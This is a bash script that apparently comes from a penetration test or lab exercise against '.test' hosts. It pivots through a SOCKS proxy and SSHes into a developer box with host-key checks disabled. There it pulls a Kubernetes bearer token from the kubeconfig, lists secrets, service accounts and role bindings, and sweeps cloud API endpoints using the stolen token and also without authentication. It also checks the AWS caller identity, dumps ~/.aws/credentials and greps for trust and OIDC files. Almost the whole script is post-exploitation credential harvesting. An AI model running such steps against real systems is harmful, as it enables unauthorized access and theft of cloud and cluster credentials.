set +e
echo "=== BOX PIVOT CHECK ==="
curl -sS --socks5-hostname 127.0.0.1:1080 -k -m 10 -o /dev/null -w 'source:%{http_code}\n' https://source.keplerops.test/
echo "=== SSH ROWAN ==="
ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 rowan-dev 'bash -s' <<'RSH'
set +e
export AWS_CA_BUNDLE=/home/rowan/.local/share/keplerops/ca.crt
JWT=$(kubectl config view --raw -o jsonpath='{.users[0].user.token}')
echo "JWT len ${#JWT}"
echo "=== K8S CM/SECRET/SA/ROLE ==="
kubectl get cm -n fieldlink 2>&1 | head -30
kubectl get secret -n fieldlink 2>&1 | head -30
kubectl get sa -n fieldlink 2>&1 | head -30
kubectl get role,rolebinding -n fieldlink 2>&1 | head -40
echo "=== K8S AUTH ==="
kubectl auth can-i --list -n fieldlink 2>&1 | head -40
echo "=== K8S PODS/JOBS ==="
kubectl get pods,jobs,deploy -n fieldlink 2>&1 | head -40
echo "=== CLOUD-API ROOT + WELLKNOWN ==="
for u in https://cloud-api.keplerops.test/ https://cloud-api.keplerops.test/.well-known/fieldkest-client https://cloud-api.keplerops.test/.well-known/openid-configuration; do
 echo "--- $u"; curl -sSk -m 8 -i "$u" | head -c 1500; echo
done
echo "=== CLOUD-API SWEEP (JWT) ==="
C=https://cloud-api.keplerops.test
for p in api/trust-records api/trust-records/TR-1 api/trust-records/current api/trust-records/TR-1/policy api/roles api/iam/roles api/workloads api/workloads/current api/workspaces api/workspaces/current api/policies/default api/exports api/exports/EXP-2841 api/token-exchange api/token-exchange/rowan-workspace api/maintenance healthz; do
  code=$(curl -sSk -m 8 -o /tmp/c -w '%{http_code}' -H "Authorization: Bearer $JWT" "$C/$p")
  echo "-- GET $p -> $code :: $(head -c 260 /tmp/c | tr '\n' ' ')"
done
echo "=== CLOUD-API NO-AUTH SWEEP ==="
for p in api/trust-records api/trust-records/TR-1 api/roles api/healthz healthz; do
  code=$(curl -sSk -m 8 -o /tmp/c -w '%{http_code}' "$C/$p")
  echo "-- ANON GET $p -> $code :: $(head -c 200 /tmp/c | tr '\n' ' ')"
done
echo "=== AWS STS CALLER ==="
aws --endpoint-url https://objects.keplerops.test sts get-caller-identity 2>&1 | head -10
echo "=== AWS CONFIG ==="
cat ~/.aws/config ~/.aws/credentials 2>/dev/null | head -40
echo "=== WORK K8S MANIFESTS / TRUST ON DISK ==="
grep -rIl -i 'trust\|oidc\|audience\|assume' ~/work ~/README.md ~/.config 2>/dev/null | head -30
RSH
echo DONE_K14_R1
